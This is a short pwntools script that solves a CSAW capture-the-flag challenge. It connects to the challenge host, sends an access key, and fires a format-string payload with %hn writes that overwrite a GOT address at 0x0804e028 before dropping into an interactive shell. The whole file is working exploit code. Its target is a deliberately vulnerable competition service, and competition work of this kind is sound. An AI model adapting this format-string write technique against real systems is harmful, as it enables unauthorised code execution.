from pwn import *

io = remote('auto-pwn.chal.csaw.io', 11002)
#io = process('./real')

print(io.recv())
io.sendline(b'4a47f4618ce3e7b567cce92b48f41e61')
print(io.recvuntil(b'Here is the binary that is currently running on this box: \n-------------------------------------------------------------------\n'))
print(io.recvuntil(b'\n-------------------------------------------------------------------'))
print(io.recv())

payload = b'AA'+p32(0x0804e028+2)+p32(0x0804e028)+b'%2042x'+b'%6$hn'+b'%38508x'+b'%7$hn'
io.sendline(payload)
io.interactive()
